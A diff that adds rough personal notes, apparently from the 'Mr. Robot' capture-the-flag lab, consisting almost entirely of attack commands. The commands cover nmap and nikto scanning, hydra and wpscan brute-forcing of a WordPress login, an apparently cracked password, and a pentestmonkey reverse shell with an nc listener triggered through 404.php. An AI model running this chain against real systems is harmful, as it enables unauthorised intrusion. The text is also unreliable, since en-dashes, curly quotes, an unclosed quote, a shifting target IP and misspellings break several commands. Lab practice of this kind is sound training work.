@@ -1,0 +1,38 @@
+ifconfig
+nmap –n –v 192.168.56.*
+nikto –h 192.168.56.102
+192.168.56.102/robots.txt
+
+cd Desktop/
+wget 192.168.56.102/key………
+wget 192.168.56.102/fsociety.dic
+
+cat key-1-of-3.txt
+cat fsociety.dic 
+
+192.168.56.102/wp-login
+
+UN=test,    PW=123
+Log=test&pwd=123&wp-submit=Log+In
+
+
+hydra –V –L fsociety.dic –p 123 192.168.109.11 http-post-form ‘/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username
+
+UN Elliot
+
+Cat fsocity.dic | sort –u | uniq > wordlist.dic
+
+wpscan --url 192.168.56.102 --wordlist /root/Desktop/wordlist.dic --username Elliot
+nmap -n -v
+ER28-0652
+
+Pentest Monekey
+Upload the downlowde file dictionary
+
+Nc –lvp 1234
+
+curl http://192.168.56.102/404.php
+
+
+
+
